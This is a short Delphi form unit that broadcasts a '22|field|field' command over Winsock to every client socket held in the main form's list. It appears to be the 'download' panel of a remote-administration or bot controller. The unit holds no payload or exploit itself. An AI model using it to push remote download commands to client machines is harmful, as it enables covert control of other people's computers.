unit uDownload;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls,winsock;

type
  TForm14 = class(TForm)
    edt1: TEdit;
    btn1: TButton;
    lbl1: TLabel;
    lbl2: TLabel;
    edt2: TEdit;
    procedure btn1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form14: TForm14;

implementation
uses mainu;
{$R *.dfm}

procedure TForm14.btn1Click(Sender: TObject);
var
  ss:integer;
  sock:integer;
  data:string;
begin
if (edt1.Text = '') or (edt2.Text = '') then begin
  showmessage('Please fill in all Boxes!');
  exit;
end;
  data := '22|' + edt1.Text + '|' + edt2.Text + #10;
try
  for ss := 0 to mainform.lv1.Items.Count -1 do begin
     send(strtoint(mainform.lv1.Items.Item[ss].SubItems.Strings[0]),data[1],length(data),0);
  end;
  Showmessage('Message sent!');
except
end;
end;

end.
